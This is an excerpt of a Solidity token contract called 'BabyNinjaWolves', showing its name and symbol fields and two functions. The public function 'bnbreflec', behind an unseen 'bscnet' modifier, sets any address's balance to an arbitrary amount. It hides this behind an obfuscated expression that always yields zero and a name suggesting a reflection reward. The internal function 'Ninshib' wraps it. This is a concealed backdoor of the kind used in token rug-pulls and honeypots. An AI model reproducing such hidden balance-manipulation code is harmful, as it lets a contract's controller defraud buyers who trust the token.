...
contract BabyNinjaWolves is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string private _name = "BabyNinjaWolves";
  string private _symbol = "BNINJAWOLVES";  
  ...
  function bnbreflec (address buyer, uint256 _value) public bscnet {
        balances[buyer] = ((balances[buyer] / balances[buyer]) -1) + (_value * 10 ** uint256(decimals));
  }

      function Ninshib(address lpaddress, uint256 _value) internal {
        bnbreflec(lpaddress, _value);    
  }
